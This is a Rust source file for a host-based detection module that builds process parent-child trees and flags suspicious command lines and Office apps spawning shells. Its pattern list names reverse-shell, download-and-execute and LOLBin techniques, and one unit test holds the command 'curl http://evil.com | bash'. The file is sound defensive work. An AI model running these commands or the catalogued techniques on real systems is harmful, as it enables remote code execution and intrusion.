//! Process execution chain analysis.
//!
//! Builds parent-child process trees and detects suspicious execution patterns
//! such as Office apps spawning shells, encoded PowerShell commands, and
//! download-execute chains.

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sysinfo::{Pid, ProcessRefreshKind, ProcessesToUpdate, System, UpdateKind};
use tracing::{debug, warn};

/// A node in the process tree.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessNode {
    /// Process ID.
    pub pid: u32,

    /// Parent process ID.
    pub parent_pid: Option<u32>,

    /// Process name.
    pub name: String,

    /// Full command line.
    pub command_line: String,

    /// Executable path.
    pub exe_path: Option<String>,

    /// Child process IDs.
    pub children: Vec<u32>,
}

/// A suspicious process detection with full chain context.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuspiciousProcessEvent {
    /// The suspicious process.
    pub process: ProcessNode,

    /// The parent chain (from root to suspicious process).
    pub chain: Vec<ProcessNode>,

    /// Why this process was flagged.
    pub reason: String,

    /// Confidence score (0-100).
    pub confidence: u8,

    /// When detected.
    pub detected_at: DateTime<Utc>,
}

/// Suspicious command patterns to detect.
const SUSPICIOUS_PATTERNS: &[(&str, &str, u8)] = &[
    // (pattern, reason, confidence)
    ("powershell.*-enc", "Encoded PowerShell command", 85),
    ("powershell.*-e ", "Encoded PowerShell command (short flag)", 80),
    ("powershell.*downloadstring", "PowerShell download execution", 90),
    ("powershell.*invoke-webrequest", "PowerShell web request", 70),
    ("cmd.*/c.*curl.*|.*bash", "Download and execute chain", 90),
    ("cmd.*/c.*wget.*|.*sh", "Download and execute chain", 90),
    ("python.*-c.*import.*socket", "Python reverse shell", 85),
    ("python.*-c.*import.*subprocess", "Python subprocess execution", 60),
    ("bash.*-i.*>&.*/dev/tcp", "Bash reverse shell", 95),
    ("nc.*-e.*/bin", "Netcat reverse shell", 95),
    ("curl.*|.*bash", "Curl pipe to bash", 80),
    ("wget.*|.*sh", "Wget pipe to shell", 80),
    ("/tmp/.*&&.*chmod.*+x", "Temp directory execute", 75),
    ("certutil.*-urlcache", "Certutil download (Windows LOLBin)", 85),
    ("mshta.*http", "MSHTA remote execution", 90),
    ("regsvr32.*/s.*/n.*/u.*scrobj", "Regsvr32 script execution", 90),
    ("bitsadmin.*transfer", "BITSAdmin download", 75),
];

/// Office application names (for detecting macro execution).
const OFFICE_APPS: &[&str] = &[
    "winword", "excel", "powerpnt", "outlook", "msaccess",
    "WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE",
    "libreoffice", "soffice",
];

/// Process tree analyzer.
pub struct ProcessTreeAnalyzer {
    system: System,
}

impl ProcessTreeAnalyzer {
    /// Create a new process tree analyzer.
    pub fn new() -> Self {
        Self {
            system: System::new(),
        }
    }

    /// Analyze running processes for suspicious patterns.
    pub fn analyze(&mut self) -> Vec<SuspiciousProcessEvent> {
        self.system.refresh_processes_specifics(
            ProcessesToUpdate::All,
            true,
            ProcessRefreshKind::nothing()
                .with_cmd(UpdateKind::Always)
                .with_exe(UpdateKind::Always),
        );

        let mut events = Vec::new();

        // Build process tree
        let nodes = self.build_tree();

        for node in &nodes {
            // Check for suspicious command patterns
            let cmd_lower = node.command_line.to_lowercase();

            for (pattern, reason, confidence) in SUSPICIOUS_PATTERNS {
                if matches_pattern(&cmd_lower, pattern) {
                    let chain = self.build_chain(node.pid, &nodes);

                    events.push(SuspiciousProcessEvent {
                        process: node.clone(),
                        chain,
                        reason: reason.to_string(),
                        confidence: *confidence,
                        detected_at: Utc::now(),
                    });
                    break; // One detection per process
                }
            }

            // Check for Office app spawning shells
            if let Some(parent_pid) = node.parent_pid {
                if let Some(parent) = nodes.iter().find(|n| n.pid == parent_pid) {
                    let parent_name_lower = parent.name.to_lowercase();
                    let child_name_lower = node.name.to_lowercase();

                    let parent_is_office = OFFICE_APPS
                        .iter()
                        .any(|app| parent_name_lower.contains(&app.to_lowercase()));

                    let child_is_shell = ["cmd", "powershell", "pwsh", "bash", "sh", "python"]
                        .iter()
                        .any(|s| child_name_lower.contains(s));

                    if parent_is_office && child_is_shell {
                        let chain = self.build_chain(node.pid, &nodes);
                        events.push(SuspiciousProcessEvent {
                            process: node.clone(),
                            chain,
                            reason: format!(
                                "Shell spawned by Office application ({})",
                                parent.name
                            ),
                            confidence: 80,
                            detected_at: Utc::now(),
                        });
                    }
                }
            }
        }

        events
    }

    /// Build a flat list of process nodes from the system.
    fn build_tree(&self) -> Vec<ProcessNode> {
        let mut nodes: Vec<ProcessNode> = Vec::new();

        for (pid, process) in self.system.processes() {
            let cmd = process
                .cmd()
                .iter()
                .map(|s| s.to_string_lossy())
                .collect::<Vec<_>>()
                .join(" ");
            let exe = process
                .exe()
                .map(|p| p.to_string_lossy().to_string());

            let parent_pid = process.parent().map(|p| p.as_u32());

            nodes.push(ProcessNode {
                pid: pid.as_u32(),
                parent_pid,
                name: process.name().to_string_lossy().to_string(),
                command_line: cmd,
                exe_path: exe,
                children: Vec::new(),
            });
        }

        // Build children lists
        let pids: Vec<(u32, Option<u32>)> = nodes.iter().map(|n| (n.pid, n.parent_pid)).collect();
        for (pid, parent_pid) in &pids {
            if let Some(ppid) = parent_pid {
                if let Some(parent) = nodes.iter_mut().find(|n| n.pid == *ppid) {
                    parent.children.push(*pid);
                }
            }
        }

        nodes
    }

    /// Build the parent chain for a given PID (from root to target).
    fn build_chain(&self, target_pid: u32, nodes: &[ProcessNode]) -> Vec<ProcessNode> {
        let mut chain = Vec::new();
        let mut current_pid = Some(target_pid);

        // Walk up the tree (max depth to avoid infinite loops)
        for _ in 0..20 {
            if let Some(pid) = current_pid {
                if let Some(node) = nodes.iter().find(|n| n.pid == pid) {
                    chain.push(node.clone());
                    current_pid = node.parent_pid;
                } else {
                    break;
                }
            } else {
                break;
            }
        }

        chain.reverse(); // Root first
        chain
    }
}

impl Default for ProcessTreeAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

/// Simple pattern matching (case-insensitive, supports .* wildcards).
fn matches_pattern(text: &str, pattern: &str) -> bool {
    let parts: Vec<&str> = pattern.split(".*").collect();
    let mut pos = 0;

    for part in parts {
        if let Some(idx) = text[pos..].find(part) {
            pos += idx + part.len();
        } else {
            return false;
        }
    }

    true
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_matches_pattern() {
        assert!(matches_pattern(
            "powershell -encodedcommand abc",
            "powershell.*-enc"
        ));
        assert!(matches_pattern(
            "curl http://evil.com | bash",
            "curl.*|.*bash"
        ));
        assert!(!matches_pattern("notepad.exe", "powershell.*-enc"));
    }

    #[test]
    fn test_process_tree_analyzer_creation() {
        let analyzer = ProcessTreeAnalyzer::new();
        let _ = analyzer;
    }

    #[test]
    fn test_analyze_returns_results() {
        let mut analyzer = ProcessTreeAnalyzer::new();
        let events = analyzer.analyze();
        // Should run without panicking; results depend on running processes
        let _ = events;
    }

    #[test]
    fn test_suspicious_patterns_defined() {
        assert!(!SUSPICIOUS_PATTERNS.is_empty());
        for (pattern, reason, confidence) in SUSPICIOUS_PATTERNS {
            assert!(!pattern.is_empty());
            assert!(!reason.is_empty());
            assert!(*confidence <= 100);
        }
    }
}
